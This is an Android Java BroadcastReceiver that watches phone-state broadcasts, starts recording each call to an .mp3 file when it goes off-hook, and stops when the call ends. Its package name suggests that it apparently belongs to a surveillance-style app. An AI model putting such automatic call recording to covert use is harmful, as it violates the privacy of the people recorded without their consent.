package com.postal.omniscient.postal.catchPhone.Call;
/**
 * Бродкастресивер для входящих
 *      (и исходящийх)
 *         звонков
 */
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;

import com.postal.omniscient.postal.adapter.EventBusCall;
import org.greenrobot.eventbus.EventBus;

public class StartPhoneCallReceiver extends BroadcastReceiver {
    public StartPhoneCallReceiver() {
    }
    Bundle bundle;
    String state;

    private static final String ACTION_IN = "android.intent.action.PHONE_STATE";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (intent.getAction().equals(ACTION_IN)) {
            if ((bundle = intent.getExtras()) != null) {
                state = bundle.getString(TelephonyManager.EXTRA_STATE);
                if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                    //поменяли In_call на Call све будем в 1ну папку кидать
                    //запускаем поток записи разговора
                    new Thread(new CallInThread(context, "Call", ".mp3"),
                            "InCallWrite").start();
                } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                    //сообщаем потоку что разговор окончен
                    EventBus.getDefault().post(new EventBusCall("stop"));
                }
            }
        }
    }
}